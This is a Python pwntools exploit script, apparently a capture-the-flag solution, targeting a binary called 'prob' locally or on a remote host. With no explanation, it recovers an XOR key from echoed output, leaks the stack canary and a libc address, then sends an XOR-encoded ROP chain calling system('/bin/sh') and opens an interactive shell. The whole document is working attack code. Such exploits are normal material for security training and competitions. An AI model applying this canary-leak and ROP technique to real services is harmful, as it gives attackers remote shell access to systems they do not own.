#!/usr/bin/env python3
from pwn import *
import sys

if len(sys.argv) == 3:
    io = remote(sys.argv[1], int(sys.argv[2]))
else:
    io = process("./prob")

io.sendlineafter(b"> ", b"A"*0x8)
leak = bytes.fromhex(io.recvline().strip().decode())
key = b""
for i in range(8):
    key += bytes([leak[i] ^ ord("A")])

io.sendlineafter(b"> ", b"A" * 0x109)
leak = bytes.fromhex(io.recvline().strip().decode())
data = b""
for i in range(0x110):
    data += bytes([leak[i] ^ key[i % 8]])
canary = u64(data[0x108:0x110]) - 0x41

io.success(f"canary: {hex(canary)}")

io.sendlineafter(b"> ", b"A" * 0x118)
leak = bytes.fromhex(io.recvline().strip().decode())
data = b""
for i in range(0x118 + 0x6):
    data += bytes([leak[i] ^ key[i % 8]])

libc_base = u64(data[0x118:0x118+6].ljust(8, b"\x00")) - 0x29d90
pop_rdi_ret = libc_base + 0x166d71
system = libc_base + 0x50d70
binsh = libc_base + 0x1d8678
io.success(f"libc_base: {hex(libc_base)}")

payload = bytearray(b"A" * 0x108 + p64(canary) + b"A" * 8 + p64(pop_rdi_ret + 1) + p64(pop_rdi_ret) + p64(binsh) + p64(system))
for i in range(len(payload)):
    payload[i] ^= key[i % 8]

payload = bytes(payload)

io.sendlineafter(b"> ", payload)

io.sendlineafter(b"> ", b"exit\x00")
io.interactive()
